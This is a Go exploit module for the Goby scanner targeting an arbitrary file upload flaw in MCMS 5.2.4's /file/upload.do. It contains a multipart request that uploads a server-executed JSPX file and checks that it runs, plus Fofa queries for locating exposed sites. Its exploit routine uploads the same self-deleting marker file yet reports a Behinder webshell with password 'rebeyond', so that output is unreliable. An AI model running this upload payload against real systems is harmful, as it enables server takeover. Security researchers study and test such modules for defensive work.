package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MCMS 5.2.4 upload.do API Arbitrary File Upload vulnerability",
    "Description": "<p>Mingfei MCms is a complete open source content management system.</p><p>MCms 5.2.4 version /file/upload.do has arbitrary file upload vulnerabilities. Attackers can upload malicious Trojan horses to control server permissions.</p>",
    "Impact": "<p>MCMS 5.2.4 Arbitrary File Upload</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS\">https://gitee.com/mingSoft/MCMS</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "MCMS",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "铭飞 MCms 5.2.4 版本 upload.do 接口存在任意文件上传漏洞",
            "Product": "MCMS",
            "Description": "<p>铭飞MCms 是一款完整开源的内容管理系统。</p><p>铭飞MCms 5.2.4版本 /file/upload.do 存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://gitee.com/mingSoft/MCMS\">https://gitee.com/mingSoft/MCMS</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>铭飞MCms 5.2.4版本 /file/upload.do 存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "MCMS 5.2.4 upload.do API Arbitrary File Upload vulnerability",
            "Product": "MCMS",
            "Description": "<p>Mingfei MCms is a complete open source content management system.</p><p>MCms 5.2.4 version /file/upload.do has arbitrary file upload vulnerabilities. Attackers can upload malicious Trojan horses to control server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS\">https://gitee.com/mingSoft/MCMS</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>MCMS 5.2.4 Arbitrary File Upload</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"ms/1.0.0/ms.js\" || body=\"铭飞MCMS\"",
    "GobyQuery": "body=\"ms/1.0.0/ms.js\" || body=\"铭飞MCMS\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://gitee.com/mingSoft/MCMS",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://forum.butian.net/share/998"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10252"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/file/upload.do"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryoau6pFB6mwCFZ9IM")
			cfg1.Data = "------WebKitFormBoundaryoau6pFB6mwCFZ9IM\r\nContent-Disposition: form-data; name=\"file\"; filename=\"213.jspx\"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<jsp:root xmlns=\"http://www.w3.org/1999/xhtml\" version=\"2.0\"  xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns:c=\"http://java.sun.com/jsp/jstl/core\">  \r\n<jsp:directive.page contentType=\"text/html;charset=UTF-8\" language=\"java\" />  \r\n<jsp:scriptlet> \r\nout.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\r\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\r\n</jsp:scriptlet>\r\n</jsp:root>\r\n------WebKitFormBoundaryoau6pFB6mwCFZ9IM\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n提交\r\n------WebKitFormBoundaryoau6pFB6mwCFZ9IM--"
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "\"result\":true") {
				FilepathFind := regexp.MustCompile("\"data\":\"(.*?)\"").FindStringSubmatch(resp1.RawBody)
				uri2 := FilepathFind[1]
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				uri1 := "/file/upload.do"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryoau6pFB6mwCFZ9IM")
				cfg1.Data = "------WebKitFormBoundaryoau6pFB6mwCFZ9IM\r\nContent-Disposition: form-data; name=\"file\"; filename=\"213.jspx\"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<jsp:root xmlns=\"http://www.w3.org/1999/xhtml\" version=\"2.0\"  xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns:c=\"http://java.sun.com/jsp/jstl/core\">  \r\n<jsp:directive.page contentType=\"text/html;charset=UTF-8\" language=\"java\" />  \r\n<jsp:scriptlet> \r\nout.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\r\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\r\n</jsp:scriptlet>\r\n</jsp:root>\r\n------WebKitFormBoundaryoau6pFB6mwCFZ9IM\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n提交\r\n------WebKitFormBoundaryoau6pFB6mwCFZ9IM--"
				if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "\"result\":true") {
					FilepathFind := regexp.MustCompile("\"data\":\"(.*?)\"").FindStringSubmatch(resp1.RawBody)
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + FilepathFind[1] + "\n"
					expResult.Output += "Password：rebeyond\n"
					expResult.Output += "Webshell tool: Behinder v3.0"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
